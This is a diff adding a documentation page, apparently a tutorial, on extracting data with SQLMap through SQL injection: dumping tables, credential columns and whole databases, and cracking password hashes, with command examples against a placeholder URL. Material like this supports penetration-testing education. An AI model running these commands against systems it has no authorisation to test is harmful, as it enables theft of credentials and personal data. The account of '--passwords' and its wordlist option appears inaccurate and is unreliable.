@@ -1,0 +1,86 @@
+---
+title: Data Extraction Techniques
+description: Learn how to extract data from databases using SQLMap
+---
+
+# Data Extraction Techniques
+
+After identifying the database structure, you can extract data from specific tables and columns of interest.
+
+## Dumping Table Data (`--dump`)
+
+To extract all data from a specific table:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name -T table_name --dump
+```
+
+This command retrieves all records from the specified table. For large tables, SQLMap will ask if you want to retrieve all entries or a subset.
+
+## Dumping Specific Columns (`-C`)
+
+To extract data from specific columns only:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name -T table_name -C "username,password,email" --dump
+```
+
+This is useful when you're only interested in certain columns, especially in tables with many columns or large amounts of data.
+
+## Conditional Data Extraction (`--where`)
+
+To extract records that match specific criteria:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name -T users -C "username,password" --dump --where "username='admin'"
+```
+
+This allows you to filter the data based on specific conditions, similar to a SQL WHERE clause.
+
+## Extracting a Range of Records (`--start` and `--stop`)
+
+For large tables, you can extract a specific range of records:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name -T users --dump --start 1 --stop 100
+```
+
+This retrieves only records 1 through 100, which is useful for paginating through large datasets.
+
+## Dumping All Databases (`--dump-all`)
+
+To extract data from all tables in all databases:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --dump-all
+```
+
+<Note title="Warning">
+This can generate a massive amount of data and take a very long time to complete. Use with caution and only when necessary.
+</Note>
+
+## Password Cracking (`--passwords`)
+
+SQLMap can attempt to identify and crack password hashes:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --passwords
+```
+
+This command:
+1. Identifies tables that might contain password hashes
+2. Extracts the hashes
+3. Attempts to crack them using a dictionary attack or brute force
+
+You can also specify a custom wordlist with `--passwords-file=/path/to/wordlist.txt`.
+
+## Optimizing Data Extraction
+
+For large databases, consider these optimization techniques:
+
+- Use `--threads` to speed up data extraction
+- Use `--dump-format=CSV` to output data in a more manageable format
+- Use `--binary-fields` to specify which fields contain binary data
+- Use `--hex` to retrieve data in hexadecimal format for binary fields
+
+These options can significantly improve the efficiency of data extraction, especially for large databases with complex data types.
